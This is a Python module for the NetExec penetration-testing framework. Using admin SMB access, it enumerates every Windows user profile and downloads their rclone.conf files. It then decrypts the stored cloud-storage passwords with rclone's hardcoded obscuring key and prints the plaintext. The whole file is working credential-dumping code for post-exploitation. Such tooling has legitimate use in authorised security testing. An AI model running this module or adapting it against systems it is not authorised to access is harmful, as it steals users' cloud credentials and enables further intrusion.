import base64
from dataclasses import dataclass
from io import BytesIO

from Cryptodome.Cipher import AES
from impacket.nt_errors import STATUS_NO_SUCH_FILE, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_OBJECT_PATH_NOT_FOUND
from impacket.smbconnection import SessionError
from nxc.helpers.misc import CATEGORY
from nxc.playbooks.results import ActionResult, ResultStatus


class NXCModule:
    name = "rclone"
    description = "Searches for rclone.conf and deobscures credentials"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    @dataclass
    class ResultData:
        files: list[dict]
        queried_users: list[str]

    result_type = ResultData

    def options(self, context, module_options):
        """No module options."""

    def on_admin_login(self, context, connection):
        files, queried_users, errors = [], [], []
        ignored = {"public", "default", "default user", "all users", ".", ".."}
        try:
            for directory in connection.conn.listPath("C$", "\\Users\\*"):
                user = directory.get_longname()
                if not directory.is_directory() or user.casefold() in ignored:
                    continue
                queried_users.append(user)
                path = f"\\Users\\{user}\\AppData\\Roaming\\rclone\\rclone.conf"
                record = {"user": user, "path": path, "content": b"", "complete": False, "encrypted": False, "entries": [], "error": None}
                with BytesIO() as buffer:
                    try:
                        connection.conn.getFile("C$", path, buffer.write)
                        record["complete"] = True
                    except SessionError as e:
                        if e.getErrorCode() in (STATUS_NO_SUCH_FILE, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_OBJECT_PATH_NOT_FOUND) and not buffer.getvalue():
                            continue
                        record["error"] = str(e)
                        raise
                    except Exception as e:
                        record["error"] = str(e) or type(e).__name__
                        raise
                    finally:
                        record["content"] = buffer.getvalue()
                        if record["complete"] or record["error"]:
                            files.append(record)
                try:
                    text = record["content"].decode("utf-8-sig")
                    record["encrypted"] = any(line.strip() == "RCLONE_ENCRYPT_V0:" for line in text.splitlines())
                    if record["encrypted"]:
                        context.log.display(f"[{user}] Encrypted rclone config; contents retained without decoding")
                        continue
                    section = None
                    for number, line in enumerate(text.splitlines(), 1):
                        line = line.strip()
                        if not line or line.startswith(("#", ";")):
                            continue
                        if line.startswith("[") and line.endswith("]"):
                            section = line[1:-1]
                            continue
                        if "=" not in line:
                            raise ValueError(f"Invalid configuration entry on line {number}")
                        key, value = map(str.strip, line.split("=", 1))
                        entry = {"section": section, "name": key, "value": value, "plaintext": None, "error": None}
                        record["entries"].append(entry)
                        if key.lower() in ("pass", "password", "password2"):
                            try:
                                entry["plaintext"] = self.deobscure(value)
                            except Exception as e:
                                entry["error"] = str(e) or type(e).__name__
                                raise
                        display = entry["plaintext"] if entry["plaintext"] is not None else value
                        context.log.highlight(f"[{user}] [{section}] {key} = {display}")
                except Exception as e:
                    record["error"] = str(e) or type(e).__name__
                    raise
        except Exception as e:
            errors.append(str(e) or type(e).__name__)
            context.log.fail(errors[-1])
        status = ResultStatus.FAILED if errors else ResultStatus.NEGATIVE if not files else ResultStatus.SKIPPED if all(record["encrypted"] for record in files) else ResultStatus.SUCCESS
        return ActionResult("smb", self.name, connection.host, status, self.ResultData(files, queried_users), error="; ".join(errors) or None)

    def deobscure(self, obscured):
        encrypted_password = self.base64_urlsafedecode(obscured)
        iv = encrypted_password[:AES.block_size]
        buf = encrypted_password[AES.block_size:]
        SECRET_KEY = b"\x9c\x93\x5b\x48\x73\x0a\x55\x4d\x6b\xfd\x7c\x63\xc8\x86\xa9\x2b\xd3\x90\x19\x8e\xb8\x12\x8a\xfb\xf4\xde\x16\x2b\x8b\x95\xf6\x38"
        crypter = AES.new(key=SECRET_KEY, mode=AES.MODE_CTR, initial_value=iv, nonce=b"")
        return crypter.decrypt(buf).decode("utf-8")

    def base64_urlsafedecode(self, string):
        padding = (4 - len(string) % 4) % 4
        string += "=" * padding
        return base64.urlsafe_b64decode(string)
